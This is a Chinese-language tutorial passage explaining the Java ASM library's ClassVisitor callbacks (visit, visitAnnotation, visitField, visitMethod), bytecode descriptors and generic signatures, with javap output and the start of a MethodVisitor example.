<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TestBean</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">等价于：</span><br><span class="line">visit(V1_6, ACC_PUBLIC | ACC_SUPER , <span class="string">"org/more/test/asm/simple/TestBean"</span>,</span><br><span class="line">      <span class="keyword">null</span>, <span class="string">"java/lang/Object"</span>, <span class="keyword">null</span>)</span><br></pre></td></tr></table></figure>

<p><strong>第一个参数：</strong>表示类版本：V1_6，表示 “.class” 文件的版本是 JDK 1.6。可用的其他版本有：V1_1（JRE_1.1）、V1_2（J2SE_1.2）、V1_3（J2SE_1.3）、V1_4（J2SE_1.4）、V1_5（J2SE_1.5）、V1_6（JavaSE_1.6）、V1_7（JavaSE_1.7）。我们所指的 JDK 6 或 JDK 7 实际上就是只 JDK 1.6 或 JDK 1.7。</p>
<p><strong>第二个参数：</strong>表示类的修饰符：修饰符在 ASM 中是以 “ACC_” 开头的常量进行定义。可以作用到类级别上的修饰符有：ACC_PUBLIC（public）、ACC_PRIVATE（private）、ACC_PROTECTED（protected）、ACC_FINAL（final）、ACC_SUPER（extends）、ACC_INTERFACE（接口）、ACC_ABSTRACT（抽象类）、ACC_ANNOTATION（注解类型）、ACC_ENUM（枚举类型）、ACC_DEPRECATED（标记了@Deprecated注解的类）、ACC_SYNTHETIC。</p>
<p><strong>第三个参数：</strong>表示类的名称：通常我们的类完整类名使用 “org.test.mypackage.MyClass” 来表示，但是到了字节码中会以路径形式表示它们 “org/test/mypackage/MyClass” 值得注意的是虽然是路径表示法但是不需要写明类的 “.class” 扩展名。</p>
<p><strong>第四个参数：</strong>表示泛型信息，如果类并未定义任何泛型该参数为空。Java 字节码中表示泛型时分别对接口和类采取不同的定义。该参数的内容格式如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&lt;泛型名:基于的类型....&gt;Ljava/lang/Object;</span><br><span class="line"></span><br><span class="line">&lt;泛型名::基于的接口....&gt;Ljava/lang/Object;</span><br></pre></td></tr></table></figure>

<p>其中 “泛型名:基于的类型” 内容可以无限的写下去，例如：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TestBean</span>&lt;<span class="title">T</span>,<span class="title">V</span>,<span class="title">Z</span>&gt; </span>&#123;</span><br><span class="line"></span><br><span class="line">泛型参数为：&lt;T:Ljava/lang/Object;V:Ljava/lang/Object;Z:Ljava/lang/Object;&gt;Ljava/lang/Object;</span><br><span class="line">分析结构如下：</span><br><span class="line">  &lt;</span><br><span class="line">   T:Ljava/lang/Object;</span><br><span class="line">   V:Ljava/lang/Object;</span><br><span class="line">   Z:Ljava/lang/Object;</span><br><span class="line">  &gt;</span><br><span class="line">   Ljava/lang/Object;</span><br></pre></td></tr></table></figure>

<p>再或者：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TestBean</span>&lt;<span class="title">T</span> <span class="keyword">extends</span> <span class="title">Date</span>, <span class="title">V</span> <span class="keyword">extends</span> <span class="title">ArrayList</span>&gt; </span>&#123;</span><br><span class="line"></span><br><span class="line">泛型参数为：&lt;T:Ljava/util/Date;V:Ljava/util/ArrayList;&gt;Ljava/lang/Object;</span><br><span class="line">分析结构如下：</span><br><span class="line">  &lt;</span><br><span class="line">   T:Ljava/util/Date;</span><br><span class="line">   V:Ljava/util/ArrayList;</span><br><span class="line">  &gt;</span><br><span class="line">   Ljava/lang/Object;</span><br></pre></td></tr></table></figure>

<p>以上内容只是针对泛型内容是基于某个具体类型的情况，如果泛型是基于接口而非类型则定义方式会有所不同，这一点需要注意。例如：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TestBean</span>&lt;<span class="title">T</span> <span class="keyword">extends</span> <span class="title">Serializable</span>, <span class="title">V</span>&gt; </span>&#123;</span><br><span class="line"></span><br><span class="line">泛型参数为：&lt;T::Ljava/io/Serializable;V:Ljava/lang/Object;&gt;Ljava/lang/Object;</span><br><span class="line">分析结构如下：</span><br><span class="line">  &lt;</span><br><span class="line">   T::Ljava/io/Serializable; <span class="comment">//比类型多出一个“:”</span></span><br><span class="line">   V:Ljava/lang/Object;</span><br><span class="line">  &gt;</span><br><span class="line">   Ljava/lang/Object;</span><br></pre></td></tr></table></figure>

<p><strong>第五个参数：</strong>表示所继承的父类。由于 Java 的类是单根结构，即所有类都继承自 java.lang.Object 因此可以简单的理解为任何类都会具有一个父类。虽然在编写 Java 程序时我们没有去写 extends 关键字去明确继承的父类，但是 JDK在编译时 总会为我们加上 “ extends Object”。所以倘若某一天你看到这样一份代码也不要过于紧张。</p>
<p><strong>第六个参数：</strong>表示类实现的接口，在 Java 中类是可以实现多个不同的接口因此此处是一个数组例如：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TestBean</span> <span class="keyword">implements</span> <span class="title">Serializable</span> , <span class="title">List</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">该参数会以 “[java/io/Serializable, java/util/List]” 形式出现。</span><br></pre></td></tr></table></figure>

<p>这里需要补充一些内容，如果类型其本身就是接口类型。对于该方法而言，接口的父类类型是 “java/lang/Object”，接口所继承的所有接口都会出现在第六个参数中。例如：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> inteface TestBean implements Serializable , List &#123;</span><br><span class="line"></span><br><span class="line">最后两个参数对应为:</span><br><span class="line">    <span class="string">"java/lang/Object"</span>, [<span class="string">"java/io/Serializable"</span>,<span class="string">"java/util/List"</span>]</span><br></pre></td></tr></table></figure>

<h3 id="visitAnnotation-String-boolean"><a href="#visitAnnotation-String-boolean" class="headerlink" title="visitAnnotation(String , boolean)"></a><strong>visitAnnotation(String , boolean)</strong></h3><p>该方法是当扫描器扫描到类注解声明时进行调用。下面是对方法中各个参数的示意：<strong>visitAnnotation(注解类型 , 注解是否可以在 JVM 中可见)</strong>。例如：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Bean</span>(&#123; <span class="string">""</span> &#125;)</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TestBean</span> </span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Bean</span>等价于：</span><br><span class="line">    visitAnnotation(<span class="string">"Lnet/hasor/core/gift/bean/Bean;"</span>, <span class="keyword">true</span>);</span><br></pre></td></tr></table></figure>

<p>下面是 @Bean 的源代码：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Retention</span>(RetentionPolicy.RUNTIME)</span><br><span class="line"><span class="meta">@Target</span>(&#123; ElementType.TYPE &#125;)</span><br><span class="line"><span class="keyword">public</span> <span class="meta">@interface</span> Bean &#123;</span><br><span class="line">    <span class="comment">/** Bean名称。*/</span></span><br><span class="line">    <span class="keyword">public</span> String[] value();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> AnnotationVisitor <span class="title">visitAnnotation</span><span class="params">(<span class="keyword">final</span> String descriptor, <span class="keyword">final</span> <span class="keyword">boolean</span> visible)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (cv != <span class="keyword">null</span>) &#123;</span><br><span class="line">      <span class="keyword">return</span> cv.visitAnnotation(descriptor, visible);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">descriptor:表示类注解类的描述；</span><br><span class="line">visible表示该注解是否运行时可见；</span><br><span class="line"><span class="keyword">return</span> AnnotationVisitor:表示该注解类的Visitor，可以用来访问注解值；</span><br></pre></td></tr></table></figure>

<p><strong>第一个参数：</strong>表示的是，注解的类型。它使用的是（“L” + “类型路径” + “;”）形式表述。</p>
<p><strong>第二个参数：</strong>表示的是，该注解是否在 JVM 中可见。这个参数的具体含义可以理解为：如果为 true 表示虚拟机可见，我们可以通过下面这样的代码获取到注解类型：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">testBeanType.getAnnotation(TestAnno<span class="class">.<span class="keyword">class</span>)</span>;</span><br></pre></td></tr></table></figure>

<p>谈到这里就需要额外说明一下在声明注解时常见的 “@Retention(RetentionPolicy.RUNTIME)” 标记。RetentionPolicy 是一个枚举它具备三个枚举元素其每个含义可以理解为：</p>
<ol>
<li>RetentionPolicy.SOURCE：声明注解只保留在 Java 源程序中，在编译 Java 类时注解信息不会被写入到 Class。如果使用的是这个配置 ASM 也将无法探测到这个注解。</li>
<li>RetentionPolicy.CLASS：声明注解仅保留在 Class 文件中，JVM 运行时并不会处理它，这意味着 ASM 可以在 visitAnnotation 时候探测到它，但是通过Class 反射无法获取到注解信息。</li>
<li>RetentionPolicy.RUNTIME：这是最常用的一种声明，ASM 可以探测到这个注解，同时 Java 反射也可以取得注解的信息。所有用到反射获取的注解都会用到这个配置，就是这个原因。</li>
</ol>
<h3 id="visitField-int-String-String-String-Object"><a href="#visitField-int-String-String-String-Object" class="headerlink" title="visitField(int , String , String , String , Object)"></a><strong>visitField(int , String , String , String , Object)</strong></h3><p>该方法是当扫描器扫描到类中字段时进行调用。下面是对方法中各个参数的示意：<strong>visitField(修饰符 , 字段名 , 字段类型 , 泛型描述 , 默认值)</strong>。例如：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TestBean</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String stringData;</span><br><span class="line"></span><br><span class="line">stringData字段等价于：</span><br><span class="line">    visitField(ACC_PRIVATE, <span class="string">"stringData"</span>, <span class="string">"Ljava/lang/String;"</span>, <span class="keyword">null</span>, <span class="keyword">null</span>)</span><br><span class="line">  </span><br><span class="line"><span class="function"><span class="keyword">public</span> FieldVisitor <span class="title">visitField</span><span class="params">( <span class="keyword">final</span> <span class="keyword">int</span> access, <span class="keyword">final</span> String name, <span class="keyword">final</span> String descriptor,<span class="keyword">final</span> String signature,</span></span></span><br><span class="line"><span class="function"><span class="params">      <span class="keyword">final</span> Object value)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (cv != <span class="keyword">null</span>) &#123;</span><br><span class="line">      <span class="keyword">return</span> cv.visitField(access, name, descriptor, signature, value);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">其中</span><br><span class="line">access：表示该域的访问方式，<span class="keyword">public</span>，<span class="keyword">private</span>或者<span class="keyword">static</span>,<span class="keyword">final</span>等等；</span><br><span class="line">name：指的是域的名称；</span><br><span class="line">descriptor:域的描述,一般指的是该field的参数类型;</span><br><span class="line">signature:指的是域的签名，一般是泛型域才会有签名;</span><br><span class="line">value:指的该域的初始值</span><br><span class="line">reture FiedVisitor:表示将返回一个可以访问该域注解和属性的访问对象，如果不感兴趣的话，可以设置为空;</span><br></pre></td></tr></table></figure>

<p><strong>access：</strong>表示字段的修饰符，修饰符在 ASM 中是以 “ACC_” 开头的常量进行定义。可以作用到字段级别上的修饰符有：ACC_PUBLIC（public）、ACC_PRIVATE（private）、ACC_PROTECTED（protected）、ACC_STATIC（static）、ACC_FINAL（final）、ACC_VOLATILE（volatile）、ACC_TRANSIENT（transient）、ACC_ENUM（枚举）、ACC_DEPRECATED（标记了@Deprecated注解的字段）、ACC_SYNTHETIC。</p>
<p><strong>name：</strong>表示field的名称。</p>
<p><strong>descriptor：</strong>表示field的参数类型，类的描述，其格式为：（“L” + 类型路径 + “;”）。</p>
<p><strong>signature：</strong>表示泛型信息， 泛型类型描述是使用（“T” + 泛型名 + “;”）加以说明。例如：“private T data;” 字段的泛型描述将会是 “ TT; ”， “ private V data; ” 字段的泛型描述将会是 “ TV; ”。例如：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TestBean</span>&lt;<span class="title">T</span>, <span class="title">V</span>&gt; </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> T data;</span><br><span class="line">    <span class="keyword">private</span> V value;</span><br><span class="line"></span><br><span class="line">等价于：</span><br><span class="line"></span><br><span class="line">visit(V1_6, ACC_PUBLIC | ACC_SUPER , <span class="string">"org/more/test/asm/simple/TestBean"</span>,</span><br><span class="line">      <span class="string">"&lt;T:Ljava/lang/Object;V:Ljava/lang/Object;&gt;Ljava/lang/Object;"</span>, <span class="comment">//定义了两个泛型类型 T 和 V</span></span><br><span class="line">      <span class="string">"java/lang/Object"</span>, <span class="keyword">null</span>)</span><br><span class="line"></span><br><span class="line">visitField(ACC_PRIVATE, <span class="string">"data"</span>, <span class="string">"Ljava/lang/Object;"</span>, <span class="string">"TT;"</span>, <span class="keyword">null</span>)  <span class="comment">//data 泛型名称为 T</span></span><br><span class="line">visitField(ACC_PRIVATE, <span class="string">"value"</span>, <span class="string">"Ljava/lang/Object;"</span>, <span class="string">"TV;"</span>, <span class="keyword">null</span>) <span class="comment">// value 泛型名称为 V</span></span><br></pre></td></tr></table></figure>

<p>还有一种情况，倘若类在定义泛型时候已经基于某个类型那么生成的代码将会是如下形式：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TestBean</span>&lt;<span class="title">T</span> <span class="keyword">extends</span> <span class="title">Serializable</span>, <span class="title">V</span>&gt; </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> T data;</span><br><span class="line">    <span class="keyword">private</span> V value;</span><br><span class="line"></span><br><span class="line">等价于：</span><br><span class="line"></span><br><span class="line">visit(V1_6, ACC_PUBLIC | ACC_SUPER , <span class="string">"org/more/test/asm/simple/TestBean"</span>,</span><br><span class="line">      <span class="string">"&lt;T::Ljava/io/Serializable;V:Ljava/lang/Object;&gt;Ljava/lang/Object;"</span>, <span class="comment">//定义了两个泛型类型 T 和 V</span></span><br><span class="line">      <span class="string">"java/lang/Object"</span>, <span class="keyword">null</span>)</span><br><span class="line"></span><br><span class="line">visitField(ACC_PRIVATE, <span class="string">"data"</span>, <span class="string">"Ljava/io/Serializable;"</span>, <span class="string">"TT;"</span>, <span class="keyword">null</span>)  <span class="comment">//data 泛型名称为 T</span></span><br><span class="line">visitField(ACC_PRIVATE, <span class="string">"value"</span>, <span class="string">"Ljava/lang/Object;"</span>, <span class="string">"TV;"</span>, <span class="keyword">null</span>)     <span class="comment">// value 泛型名称为 V</span></span><br></pre></td></tr></table></figure>

<p><strong>value：</strong>表示的是默认值， 由于默认值是 Object 类型大家可能以为可以是任何类型。这里要澄清一下，默认值中只能用来表述 Java 基本类型这其中包括了（byte、sort、int、long、float、double、boolean、String）其他所有类型都不可以进行表述。并且只有标有 “final” 修饰符的字段并且该字段赋有初值时这个参数才会有值。例如类：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TestBean</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> String data;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">TestBean</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        data = <span class="string">"aa"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">....</span><br></pre></td></tr></table></figure>

<p>在执行 “visitField” 方法时候，这个参数的就是 null 值，下面这种代码也会是 null 值：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TestBean</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Date data;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">TestBean</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        data =<span class="keyword">new</span> Date();</span><br><span class="line">    &#125;</span><br><span class="line">....</span><br></pre></td></tr></table></figure>

<p>此外如果字段使用的是基本类型的包装类型，诸如：Integer、Long…也会为空值：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TestBean</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Integer intData = <span class="number">12</span>;</span><br><span class="line">...</span><br></pre></td></tr></table></figure>

<p>能够正确得到默认值的代码应该是这个样子的：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TestBean</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> String data    = <span class="string">"ABC"</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> <span class="keyword">int</span>    intData = <span class="number">12</span>;</span><br><span class="line">...</span><br></pre></td></tr></table></figure>

<h3 id="visitMethod-int-String-String-String-String"><a href="#visitMethod-int-String-String-String-String" class="headerlink" title="visitMethod(int , String , String , String , String[])"></a><strong>visitMethod(int , String , String , String , String[])</strong></h3><p>该方法是当扫描器扫描到类的方法时进行调用。下面是对方法中各个参数的示意：<strong>visitMethod(修饰符 , 方法名 , 方法签名 , 泛型信息 , 抛出的异常)</strong>。例如：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TestBean</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">halloAop</span><span class="params">(String param)</span> <span class="keyword">throws</span> Throwable </span>&#123;</span><br><span class="line"></span><br><span class="line">等价于：</span><br><span class="line"></span><br><span class="line">visit(V1_6, ACC_PUBLIC | ACC_SUPER , <span class="string">"org/more/test/asm/simple/TestBean"</span>,</span><br><span class="line">      <span class="keyword">null</span>, <span class="string">"java/lang/Object"</span>, <span class="keyword">null</span>)</span><br><span class="line"></span><br><span class="line">visitMethod(ACC_PUBLIC, <span class="string">"&lt;init&gt;"</span>, <span class="string">"()V"</span>, <span class="keyword">null</span>, <span class="keyword">null</span>)</span><br><span class="line">visitMethod(ACC_PUBLIC, <span class="string">"halloAop"</span>, <span class="string">"(Ljava/lang/String;)I"</span>, <span class="keyword">null</span>, [java/lang/Throwable])</span><br><span class="line">  </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> MethodVisitor <span class="title">visitMethod</span><span class="params">( <span class="keyword">final</span> <span class="keyword">int</span> access,<span class="keyword">final</span> String name,<span class="keyword">final</span> String descriptor,<span class="keyword">final</span> String signature, <span class="keyword">final</span> String[] exceptions)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (cv != <span class="keyword">null</span>) &#123;</span><br><span class="line">      <span class="keyword">return</span> cv.visitMethod(access, name, descriptor, signature, exceptions);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>access：</strong>表示方法的修饰符，修饰符在 ASM 中是以 “ACC_” 开头的常量进行定义。可以作用到方法级别上的修饰符有：ACC_PUBLIC（public）、ACC_PRIVATE（private）、ACC_PROTECTED（protected）、ACC_STATIC（static）、ACC_FINAL（final）、ACC_SYNCHRONIZED（同步的）、ACC_VARARGS（不定参数个数的方法）、ACC_NATIVE（native类型方法）、ACC_ABSTRACT（抽象的）、ACC_DEPRECATED（标记了@Deprecated注解的方法）、ACC_STRICT、ACC_SYNTHETIC。</p>
<p><strong>name：</strong>表示方法名，在 ASM 中 “visitMethod” 方法会处理（构造方法、静态代码块、私有方法、受保护的方法、共有方法、native类型方法）。在这些范畴中构造方法的方法名为 “<init>”，静态代码块的方法名为 “<clinit>”。列如：</clinit></init></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TestBean</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">halloAop</span><span class="params">(String param)</span> <span class="keyword">throws</span> Throwable </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        System.out.println();</span><br><span class="line">    &#125;</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">等价于：</span><br><span class="line"></span><br><span class="line">visit(V1_6, ACC_PUBLIC | ACC_SUPER , <span class="string">"org/more/test/asm/simple/TestBean"</span>,</span><br><span class="line">      <span class="keyword">null</span>, <span class="string">"java/lang/Object"</span>, <span class="keyword">null</span>)</span><br><span class="line"></span><br><span class="line">visitMethod(ACC_PUBLIC, <span class="string">"&lt;clinit&gt;"</span>, <span class="string">"()V"</span>, <span class="keyword">null</span>, <span class="keyword">null</span>)</span><br><span class="line">visitMethod(ACC_PUBLIC, <span class="string">"&lt;init&gt;"</span>, <span class="string">"()V"</span>, <span class="keyword">null</span>, <span class="keyword">null</span>)</span><br><span class="line">visitMethod(ACC_PUBLIC, <span class="string">"halloAop"</span>, <span class="string">"(Ljava/lang/String;)I"</span>, <span class="keyword">null</span>, [java/lang/Throwable])</span><br></pre></td></tr></table></figure>

<p><strong>descriptor：</strong>表示方法签名，方法签名的格式如下：“(参数列表)返回值类型”。在字节码中不同的类型都有其对应的代码，如下所示：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="string">"I"</span>        = <span class="keyword">int</span></span><br><span class="line"><span class="string">"B"</span>        = <span class="keyword">byte</span></span><br><span class="line"><span class="string">"C"</span>        = <span class="keyword">char</span></span><br><span class="line"><span class="string">"D"</span>        = <span class="keyword">double</span></span><br><span class="line"><span class="string">"F"</span>        = <span class="keyword">float</span></span><br><span class="line"><span class="string">"J"</span>        = <span class="keyword">long</span></span><br><span class="line"><span class="string">"S"</span>        = <span class="keyword">short</span></span><br><span class="line"><span class="string">"Z"</span>        = <span class="keyword">boolean</span></span><br><span class="line"><span class="string">"V"</span>        = <span class="keyword">void</span></span><br><span class="line"><span class="string">"[...;"</span>    = 数组</span><br><span class="line"><span class="string">"[[...;"</span>   = 二维数组</span><br><span class="line"><span class="string">"[[[...;"</span>  = 三维数组</span><br><span class="line"><span class="string">"L....;"</span>   = 引用类型</span><br></pre></td></tr></table></figure>

<p>下面是一些方法签名对应的方法参数列表:</p>
<p><img src="../images/ASM%E7%AC%94%E8%AE%B0/image-20200509162013272.png" alt="image-20200509162013272"></p>
<p><strong>signature：</strong>凡是具有泛型信息的方法，该参数都会有值。并且该值的内容信息基本等于第三个参数的拷贝，只不过不同的是泛型参数被特殊标记出来。例如：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TestBean</span>&lt;<span class="title">T</span>, <span class="title">V</span> <span class="keyword">extends</span> <span class="title">List</span>&gt; </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> T <span class="title">halloAop</span><span class="params">(V abc, <span class="keyword">int</span> aaa)</span> <span class="keyword">throws</span> Throwable </span>&#123;</span><br><span class="line"></span><br><span class="line">方法签名：(Ljava/util/List;I)Ljava/lang/Object;</span><br><span class="line">泛型签名：(TV;I)TT;</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TestBean</span>&lt;<span class="title">T</span>, <span class="title">V</span> <span class="keyword">extends</span> <span class="title">List</span>&gt; </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">halloAop</span><span class="params">(V abc, <span class="keyword">int</span> aaa)</span> <span class="keyword">throws</span> Throwable </span>&#123;</span><br><span class="line"></span><br><span class="line">方法签名：(Ljava/util/List;I)Ljava/lang/String;</span><br><span class="line">泛型签名：(TV;I)Ljava/lang/String;</span><br></pre></td></tr></table></figure>

<p>可以看出泛型信息中用于标识泛型类型的结构是（“T” + 泛型名 + “;”），还有一种情况就是。泛型是声明在方法上。例如：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TestBean</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> &lt;T extends List&gt; <span class="function">String <span class="title">halloAop</span><span class="params">(T abc, <span class="keyword">int</span> aaa)</span> <span class="keyword">throws</span> Throwable </span>&#123;</span><br><span class="line"></span><br><span class="line">方法签名：(Ljava/util/List;I)Ljava/lang/String;</span><br><span class="line">泛型签名：&lt;T::Ljava/util/List;&gt;(TT;I)Ljava/lang/String; <span class="comment">//泛型类型基于接口</span></span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TestBean</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> &lt;T&gt; <span class="function">String <span class="title">halloAop</span><span class="params">(T abc, <span class="keyword">int</span> aaa)</span> <span class="keyword">throws</span> Throwable </span>&#123;</span><br><span class="line"></span><br><span class="line">方法签名：(Ljava/lang/Object;I)Ljava/lang/String;</span><br><span class="line">泛型签名：&lt;T:Ljava/lang/Object;&gt;(TT;I)Ljava/lang/String; <span class="comment">//泛型类型基于类型</span></span><br></pre></td></tr></table></figure>

<p><strong>exceptions：</strong>用来表示将会抛出的异常，如果方法不会抛出异常，则该参数为空。这个参数的表述形式比较简单，举一个例子：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TestBean</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> &lt;T&gt; <span class="function">String <span class="title">halloAop</span><span class="params">(T abc, <span class="keyword">int</span> aaa)</span> <span class="keyword">throws</span> Throwable,Exception </span>&#123;</span><br><span class="line"></span><br><span class="line">异常参数为：[java/lang/Throwable, java/lang/Exception]</span><br></pre></td></tr></table></figure>

<h2 id="MethodVisitor"><a href="#MethodVisitor" class="headerlink" title="MethodVisitor"></a>MethodVisitor</h2><p>假设有下面这样的一个类：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">DemoClass</span> </span>&#123;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">		System.out.println();</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>通过Javap可以得到下面这样的输出：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">$ javap -c classtest.DemoClass</span><br><span class="line">Compiled from <span class="string">"DemoClass.java"</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">classtest</span>.<span class="title">DemoClass</span> <span class="keyword">extends</span> <span class="title">java</span>.<span class="title">lang</span>.<span class="title">Object</span></span>&#123;</span><br><span class="line"><span class="keyword">public</span> classtest.DemoClass();</span><br><span class="line">  Code:</span><br><span class="line">   <span class="number">0</span>:   aload_0</span><br><span class="line">   1:   invokespecial   #8; //Method java/lang/Object."&lt;init&gt;":()V</span><br><span class="line">   <span class="number">4</span>:   <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(java.lang.String[])</span></span>;</span><br><span class="line">  Code:</span><br><span class="line">   0:   getstatic       #16; //Field java/lang/System.out:Ljava/io/PrintStream;</span><br><span class="line">   3:   invokevirtual   #22; //Method java/io/PrintStream.println:()V</span><br><span class="line">   <span class="number">6</span>:   <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以看出其实Java编译完这个类之后是产生了两个方法。其中一个是第四行表示的“public classtest.DemoClass();”它是构造方法。</p>
<p>和第十行表示的“main”方法。下面这段例子用来扫描这个类的这两个方法，我们的扫描逻辑很简单就是当遇到一个定义的方法时输出这个方法名。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">DemoClassTest</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        ClassReader cr = <span class="keyword">new</span> ClassReader(DemoClass<span class="class">.<span class="keyword">class</span>.<span class="title">getName</span>())</span>;</span><br><span class="line">        cr.accept(<span class="keyword">new</span> DemoClassVisitor(), ClassReader.SKIP_DEBUG);</span><br><span class="line">        System.out.println(<span class="string">"---ALL END---"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">DemoClassVisitor</span> <span class="keyword">extends</span> <span class="title">ClassVisitor</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">DemoClassVisitor</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>(Opcodes.ASM4);</span><br><span class="line">    &#125;</span><br><span class="line">    <span 